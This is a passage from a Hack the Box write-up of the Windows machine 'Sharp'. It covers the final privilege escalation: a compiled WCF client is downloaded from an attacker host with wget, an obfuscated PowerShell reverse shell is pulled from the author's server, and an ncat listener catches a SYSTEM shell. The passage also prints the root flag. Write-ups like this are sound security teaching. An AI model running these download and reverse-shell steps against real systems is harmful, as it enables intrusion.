    </span><span class="nx">164</span><span class="w">      </span><span class="nx">11</span><span class="w">     </span><span class="nx">6928</span><span class="w">      </span><span class="nx">21380</span><span class="w">       </span><span class="nx">0.55</span><span class="w">   </span><span class="nx">2764</span><span class="w">   </span><span class="nx">1</span><span class="w"> </span><span class="nx">conhost</span><span class="w">
    </span><span class="mi">162</span><span class="w">      </span><span class="mi">10</span><span class="w">     </span><span class="mi">6896</span><span class="w">      </span><span class="mi">13864</span><span class="w">       </span><span class="mf">0.31</span><span class="w">   </span><span class="mi">3644</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="n">conhost</span><span class="w">
    </span><span class="nx">161</span><span class="w">      </span><span class="nx">10</span><span class="w">     </span><span class="nx">6916</span><span class="w">      </span><span class="nx">14492</span><span class="w">       </span><span class="nx">3.33</span><span class="w">   </span><span class="nx">3916</span><span class="w">   </span><span class="nx">1</span><span class="w"> </span><span class="nx">conhost</span><span class="w">
    </span><span class="mi">363</span><span class="w">      </span><span class="mi">15</span><span class="w">     </span><span class="mi">2228</span><span class="w">       </span><span class="mi">5368</span><span class="w">               </span><span class="mi">380</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">csrss</span><span class="w">
    </span><span class="nx">245</span><span class="w">      </span><span class="nx">11</span><span class="w">     </span><span class="nx">2036</span><span class="w">       </span><span class="nx">5220</span><span class="w">               </span><span class="nx">492</span><span class="w">   </span><span class="nx">1</span><span class="w"> </span><span class="nx">csrss</span><span class="w">
    </span><span class="mi">256</span><span class="w">      </span><span class="mi">13</span><span class="w">     </span><span class="mi">3996</span><span class="w">      </span><span class="mi">13460</span><span class="w">              </span><span class="mi">2228</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">dllhost</span><span class="w">
     </span><span class="nx">49</span><span class="w">       </span><span class="nx">6</span><span class="w">     </span><span class="nx">1360</span><span class="w">       </span><span class="nx">4524</span><span class="w">               </span><span class="nx">768</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">fontdrvhost</span><span class="w">
     </span><span class="mi">49</span><span class="w">       </span><span class="mi">6</span><span class="w">     </span><span class="mi">1528</span><span class="w">       </span><span class="mi">5040</span><span class="w">               </span><span class="mi">776</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="n">fontdrvhost</span><span class="w">
      </span><span class="nx">0</span><span class="w">       </span><span class="nx">0</span><span class="w">       </span><span class="nx">56</span><span class="w">          </span><span class="nx">8</span><span class="w">                 </span><span class="nx">0</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">Idle</span><span class="w">
    </span><span class="mi">834</span><span class="w">      </span><span class="mi">21</span><span class="w">     </span><span class="mi">5232</span><span class="w">      </span><span class="mi">13904</span><span class="w">               </span><span class="mi">628</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">lsass</span><span class="w">
    </span><span class="nx">224</span><span class="w">      </span><span class="nx">13</span><span class="w">     </span><span class="nx">3044</span><span class="w">      </span><span class="nx">10516</span><span class="w">              </span><span class="nx">2560</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">msdtc</span><span class="w">
    </span><span class="mi">518</span><span class="w">      </span><span class="mi">68</span><span class="w">   </span><span class="mi">144628</span><span class="w">     </span><span class="mi">137332</span><span class="w">              </span><span class="mi">1844</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">MsMpEng</span><span class="w">
    </span><span class="nx">569</span><span class="w">      </span><span class="nx">31</span><span class="w">    </span><span class="nx">87092</span><span class="w">      </span><span class="nx">98904</span><span class="w">     </span><span class="nx">143.75</span><span class="w">   </span><span class="nx">3508</span><span class="w">   </span><span class="nx">1</span><span class="w"> </span><span class="nx">powershell</span><span class="w">
    </span><span class="mi">660</span><span class="w">      </span><span class="mi">38</span><span class="w">   </span><span class="mi">467440</span><span class="w">     </span><span class="mi">300140</span><span class="w">     </span><span class="mf">281.73</span><span class="w">   </span><span class="mi">4024</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="n">powershell</span><span class="w">
      </span><span class="nx">0</span><span class="w">       </span><span class="nx">9</span><span class="w">      </span><span class="nx">204</span><span class="w">      </span><span class="nx">34860</span><span class="w">                </span><span class="nx">88</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">Registry</span><span class="w">
    </span><span class="mi">276</span><span class="w">      </span><span class="mi">16</span><span class="w">    </span><span class="mi">16736</span><span class="w">      </span><span class="mi">16376</span><span class="w">       </span><span class="mf">0.03</span><span class="w">    </span><span class="mi">948</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="n">Server</span><span class="w">
    </span><span class="nx">396</span><span class="w">      </span><span class="nx">10</span><span class="w">     </span><span class="nx">3940</span><span class="w">       </span><span class="nx">8176</span><span class="w">               </span><span class="nx">620</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">services</span><span class="w">
     </span><span class="mi">53</span><span class="w">       </span><span class="mi">3</span><span class="w">      </span><span class="mi">484</span><span class="w">       </span><span class="mi">1216</span><span class="w">               </span><span class="mi">276</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">smss</span><span class="w">
    </span><span class="nx">298</span><span class="w">      </span><span class="nx">12</span><span class="w">     </span><span class="nx">8180</span><span class="w">      </span><span class="nx">12752</span><span class="w">               </span><span class="nx">340</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">185</span><span class="w">       </span><span class="mi">9</span><span class="w">     </span><span class="mi">1744</span><span class="w">       </span><span class="mi">7756</span><span class="w">               </span><span class="mi">476</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">423</span><span class="w">       </span><span class="nx">9</span><span class="w">     </span><span class="nx">2732</span><span class="w">       </span><span class="nx">9052</span><span class="w">               </span><span class="nx">616</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">216</span><span class="w">      </span><span class="mi">11</span><span class="w">     </span><span class="mi">2044</span><span class="w">       </span><span class="mi">9840</span><span class="w">               </span><span class="mi">704</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
     </span><span class="nx">86</span><span class="w">       </span><span class="nx">5</span><span class="w">      </span><span class="nx">868</span><span class="w">       </span><span class="nx">3948</span><span class="w">               </span><span class="nx">748</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">279</span><span class="w">      </span><span class="mi">12</span><span class="w">     </span><span class="mi">3000</span><span class="w">       </span><span class="mi">9720</span><span class="w">               </span><span class="mi">784</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">340</span><span class="w">      </span><span class="nx">20</span><span class="w">    </span><span class="nx">10016</span><span class="w">      </span><span class="nx">15896</span><span class="w">               </span><span class="nx">792</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">537</span><span class="w">      </span><span class="mi">16</span><span class="w">     </span><span class="mi">3848</span><span class="w">      </span><span class="mi">10836</span><span class="w">               </span><span class="mi">872</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">233</span><span class="w">      </span><span class="nx">10</span><span class="w">     </span><span class="nx">1784</span><span class="w">       </span><span class="nx">7140</span><span class="w">               </span><span class="nx">912</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">327</span><span class="w">      </span><span class="mi">18</span><span class="w">     </span><span class="mi">4588</span><span class="w">      </span><span class="mi">14148</span><span class="w">              </span><span class="mi">1064</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">165</span><span class="w">       </span><span class="nx">9</span><span class="w">     </span><span class="nx">1752</span><span class="w">       </span><span class="nx">8164</span><span class="w">              </span><span class="nx">1104</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">120</span><span class="w">      </span><span class="mi">12</span><span class="w">     </span><span class="mi">2488</span><span class="w">       </span><span class="mi">6688</span><span class="w">              </span><span class="mi">1144</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">216</span><span class="w">       </span><span class="nx">9</span><span class="w">     </span><span class="nx">2100</span><span class="w">       </span><span class="nx">7716</span><span class="w">              </span><span class="nx">1180</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">229</span><span class="w">      </span><span class="mi">11</span><span class="w">     </span><span class="mi">2624</span><span class="w">       </span><span class="mi">8116</span><span class="w">              </span><span class="mi">1188</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">116</span><span class="w">       </span><span class="nx">7</span><span class="w">     </span><span class="nx">1184</span><span class="w">       </span><span class="nx">5956</span><span class="w">              </span><span class="nx">1228</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">384</span><span class="w">      </span><span class="mi">31</span><span class="w">     </span><span class="mi">7164</span><span class="w">      </span><span class="mi">14816</span><span class="w">              </span><span class="mi">1276</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">187</span><span class="w">      </span><span class="nx">10</span><span class="w">     </span><span class="nx">1852</span><span class="w">       </span><span class="nx">7776</span><span class="w">              </span><span class="nx">1292</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">188</span><span class="w">      </span><span class="mi">10</span><span class="w">     </span><span class="mi">1848</span><span class="w">       </span><span class="mi">8764</span><span class="w">              </span><span class="mi">1412</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">119</span><span class="w">       </span><span class="nx">7</span><span class="w">     </span><span class="nx">1172</span><span class="w">       </span><span class="nx">5668</span><span class="w">              </span><span class="nx">1488</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">184</span><span class="w">      </span><span class="mi">22</span><span class="w">     </span><span class="mi">2696</span><span class="w">      </span><span class="mi">10140</span><span class="w">              </span><span class="mi">1496</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">417</span><span class="w">      </span><span class="nx">19</span><span class="w">    </span><span class="nx">17564</span><span class="w">      </span><span class="nx">30480</span><span class="w">              </span><span class="nx">1516</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">262</span><span class="w">      </span><span class="mi">13</span><span class="w">     </span><span class="mi">2536</span><span class="w">       </span><span class="mi">8088</span><span class="w">              </span><span class="mi">1568</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">405</span><span class="w">      </span><span class="nx">16</span><span class="w">    </span><span class="nx">13096</span><span class="w">      </span><span class="nx">22272</span><span class="w">              </span><span class="nx">1576</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">137</span><span class="w">       </span><span class="mi">8</span><span class="w">     </span><span class="mi">1468</span><span class="w">       </span><span class="mi">6324</span><span class="w">              </span><span class="mi">1664</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">210</span><span class="w">      </span><span class="nx">12</span><span class="w">     </span><span class="nx">1816</span><span class="w">       </span><span class="nx">7652</span><span class="w">              </span><span class="nx">1672</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">328</span><span class="w">      </span><span class="mi">13</span><span class="w">     </span><span class="mi">3848</span><span class="w">      </span><span class="mi">11160</span><span class="w">              </span><span class="mi">1688</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">208</span><span class="w">      </span><span class="nx">11</span><span class="w">     </span><span class="nx">2420</span><span class="w">       </span><span class="nx">8540</span><span class="w">              </span><span class="nx">1708</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">458</span><span class="w">      </span><span class="mi">17</span><span class="w">     </span><span class="mi">5120</span><span class="w">      </span><span class="mi">15576</span><span class="w">              </span><span class="mi">1820</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">256</span><span class="w">      </span><span class="nx">14</span><span class="w">    </span><span class="nx">10192</span><span class="w">      </span><span class="nx">12148</span><span class="w">              </span><span class="nx">2336</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">164</span><span class="w">      </span><span class="mi">10</span><span class="w">     </span><span class="mi">1948</span><span class="w">       </span><span class="mi">7696</span><span class="w">              </span><span class="mi">2360</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">304</span><span class="w">      </span><span class="nx">17</span><span class="w">    </span><span class="nx">14876</span><span class="w">      </span><span class="nx">27468</span><span class="w">              </span><span class="nx">3096</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">201</span><span class="w">      </span><span class="mi">10</span><span class="w">     </span><span class="mi">2232</span><span class="w">       </span><span class="mi">8256</span><span class="w">              </span><span class="mi">3248</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
    </span><span class="nx">116</span><span class="w">       </span><span class="nx">7</span><span class="w">     </span><span class="nx">1244</span><span class="w">       </span><span class="nx">5492</span><span class="w">              </span><span class="nx">3256</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">svchost</span><span class="w">
    </span><span class="mi">132</span><span class="w">       </span><span class="mi">8</span><span class="w">     </span><span class="mi">3472</span><span class="w">      </span><span class="mi">10428</span><span class="w">              </span><span class="mi">4064</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">svchost</span><span class="w">
   </span><span class="nx">1142</span><span class="w">       </span><span class="nx">0</span><span class="w">      </span><span class="nx">192</span><span class="w">        </span><span class="nx">156</span><span class="w">                 </span><span class="nx">4</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">System</span><span class="w">
    </span><span class="mi">206</span><span class="w">      </span><span class="mi">12</span><span class="w">     </span><span class="mi">2004</span><span class="w">       </span><span class="mi">9872</span><span class="w">       </span><span class="mf">0.11</span><span class="w">   </span><span class="mi">3732</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="n">taskhostw</span><span class="w">
    </span><span class="nx">170</span><span class="w">      </span><span class="nx">12</span><span class="w">     </span><span class="nx">3236</span><span class="w">      </span><span class="nx">10676</span><span class="w">              </span><span class="nx">1696</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">VGAuthService</span><span class="w">
    </span><span class="mi">133</span><span class="w">       </span><span class="mi">8</span><span class="w">     </span><span class="mi">1604</span><span class="w">       </span><span class="mi">6720</span><span class="w">              </span><span class="mi">1020</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">vm3dservice</span><span class="w">
    </span><span class="nx">131</span><span class="w">       </span><span class="nx">9</span><span class="w">     </span><span class="nx">1672</span><span class="w">       </span><span class="nx">7428</span><span class="w">       </span><span class="nx">0.02</span><span class="w">   </span><span class="nx">3324</span><span class="w">   </span><span class="nx">1</span><span class="w"> </span><span class="nx">vm3dservice</span><span class="w">
    </span><span class="mi">200</span><span class="w">      </span><span class="mi">16</span><span class="w">     </span><span class="mi">4732</span><span class="w">      </span><span class="mi">13764</span><span class="w">       </span><span class="mf">1.19</span><span class="w">   </span><span class="mi">1016</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="n">vmtoolsd</span><span class="w">
    </span><span class="nx">359</span><span class="w">      </span><span class="nx">22</span><span class="w">    </span><span class="nx">10200</span><span class="w">      </span><span class="nx">22176</span><span class="w">              </span><span class="nx">1680</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">vmtoolsd</span><span class="w">
    </span><span class="mi">293</span><span class="w">      </span><span class="mi">20</span><span class="w">    </span><span class="mi">16128</span><span class="w">      </span><span class="mi">20452</span><span class="w">               </span><span class="mi">756</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">WcfServer</span><span class="w">
    </span><span class="nx">171</span><span class="w">      </span><span class="nx">11</span><span class="w">     </span><span class="nx">1460</span><span class="w">       </span><span class="nx">7072</span><span class="w">               </span><span class="nx">484</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">wininit</span><span class="w">
    </span><span class="mi">263</span><span class="w">      </span><span class="mi">12</span><span class="w">     </span><span class="mi">2716</span><span class="w">      </span><span class="mi">11748</span><span class="w">               </span><span class="mi">544</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="n">winlogon</span><span class="w">
    </span><span class="nx">549</span><span class="w">      </span><span class="nx">17</span><span class="w">     </span><span class="nx">9772</span><span class="w">      </span><span class="nx">20148</span><span class="w">              </span><span class="nx">2424</span><span class="w">   </span><span class="nx">0</span><span class="w"> </span><span class="nx">WmiPrvSE</span><span class="w">
</span></pre></table></code></div></div><p>Process 756 was linked to the service <code class="language-plaintext highlighter-rouge">WcfServer</code>.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="nx">Get-Childitem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-Like</span><span class="w"> </span><span class="s2">"wcfserver"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>I did a search to see if I could find this file but it didn’t find anything. It was probably running from a folder that I couldn’t see and didn’t have permissions to access. This might mean that it was running with someone else’s permissions. If I could compile my version of the client and transfer it over, I could get this other user to run my implementations of their own code.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>1&gt;------ Build started: Project: RemotingLibrary, Configuration: Debug Any CPU ------
1&gt;  RemotingLibrary -&gt; C:\Users\User\Desktop\wcf\wcf\RemotingLibrary\bin\Debug\WcfRemotingLibrary.dll
2&gt;------ Build started: Project: Client, Configuration: Debug Any CPU ------
3&gt;------ Build started: Project: Server, Configuration: Debug Any CPU ------
2&gt;  Client -&gt; C:\Users\User\Desktop\wcf\wcf\Client\bin\Debug\WcfClient.exe
========== Build: 3 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========

</pre></table></code></div></div><p>This project was much easier to build, and had no errors.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-22-build3.png" alt="A list of the output files after the successful build of the project" /></p><p>After the project finished building, I had a handful of files. One of the files that was included was <code class="language-plaintext highlighter-rouge">System.Management.Automation.dll</code>. This was interesting, because this is the library that contains the code for actually running PowerShell. With this included I could run PowerShell commands without PowerShell.exe.</p><p>I tried to copy over the compiled files to the <code class="language-plaintext highlighter-rouge">dev</code> share, but I didn’t have the proper permissions to write to it remotely. I would have to do it the old-fashioned way.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\User\Desktop\wcf\wcf\Client\bin\Release</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Compress-Archive</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="nt">-DestinationPath</span><span class="w"> </span><span class="o">.</span><span class="nx">/wcf.zip</span><span class="w">
</span></pre></table></code></div></div><p>On my Windows VM I zipped up the files I had compiled</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="nx">wget</span><span class="w"> </span><span class="nx">http://10.10.14.172:8090/wcf.zip</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">wcf.zip</span><span class="w">
</span><span class="n">PS</span><span class="err">&gt;</span><span class="nx">Expand-Archive</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="o">.</span><span class="nx">/wcf.zip</span><span class="w"> </span><span class="nt">-DestinationPath</span><span class="w"> </span><span class="o">.</span><span class="nx">/test</span><span class="w">
</span></pre></table></code></div></div><p>I copied the zip file over to the victim machine, extracted it, them ran <code class="language-plaintext highlighter-rouge">WcfClient.exe</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>10.10.10.219 - - [24/Apr/2021 14:14:10] "GET /wcf.zip HTTP/1.1" 200 -
10.10.10.219 - - [24/Apr/2021 14:14:36] "GET /test2.ps1 HTTP/1.1" 200 -
</pre></table></code></div></div><p>Got a hit on my python server downloading the obfuscated powershell reverse shell</p><h3 id="getting-a-shell">Getting a shell</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre><td class="rouge-code"><pre>PS C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Debug\Release&gt; .\ncat.exe -lvn 9001
Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.219:49764.
PS&gt;whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
</pre></table></code></div></div><h3 id="roottxt">Root.txt</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>PS&gt;type C:\Users\Administrator\Desktop\root.txt
f85fa6f86f1a6bb0a693093b7b095e35
</pre></table></code></div></div><p>The root proof was located on the Administrator’s Desktop. My shell exited shorty after I collected it. I connected again to see if this was only a one time problem, but it happened again. If you need more time, or wanted to set up persistence you will need to send yourself another shell that is not linked to this <code class="language-plaintext highlighter-rouge">wcfserver</code> process as it is likely restarting periodically.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-0-pwned.png" alt="Hack the Box message showing successful completion of this challenge" /></p><p>Thanks to <a href="https://app.hackthebox.eu/users/9164"><code class="language-plaintext highlighter-rouge">cube0x0</code></a> for creating a fun yet challenging Windows machine. There are never enough difficult Windows challenges to work through so every one is appreciated! I also enjoyed the fact that the binaries were written in C-Sharp, as this language is much easier to reverse and understand than say, C.</p><p>If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at <a href="https://github.com/zweilosec">https://github.com/zweilosec</a> or in the comments below!</p><p>If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&amp;emoji=&amp;slug=zweilosec&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Lato&amp;outline_colour=000000&amp;coffee_colour=ffffff" /></a></p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/csharp/" class="post-tag no-text-decoration" >csharp</a> <a href="/tags/net/" class="post-tag no-text-decoration" >.net</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >powershell</a> <a href="/tags/ysoserial/" class="post-tag no-text-decoration" >ysoserial</a> <a href="/tags/smb/" class="post-tag no-text-decoration" >smb</a> <a href="/tags/zip/" class="post-tag no-text-decoration" >zip</a> <a href="/tags/hard/" class="post-tag no-text-decoration" >hard</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Sharp Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/sharp/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Sharp Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/sharp/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack the Box - Sharp Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/sharp/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> 